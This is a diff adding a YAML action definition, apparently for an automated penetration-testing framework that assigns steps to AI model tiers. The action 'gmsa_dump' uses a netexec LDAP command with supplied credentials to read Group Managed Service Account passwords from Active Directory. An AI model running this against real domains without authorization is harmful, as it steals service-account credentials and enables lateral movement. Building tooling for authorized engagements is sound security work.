@@ -1,0 +1,17 @@
+name: gmsa_dump
+category: ad
+description: Dump gMSA password from AD
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "netexec ldap {target_ip} -u '{username}' -p '{password}' --gmsa"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Group Managed Service Accounts have passwords stored in msDS-ManagedPassword. Readable by principals in PrincipalsAllowedToRetrieveManagedPassword."
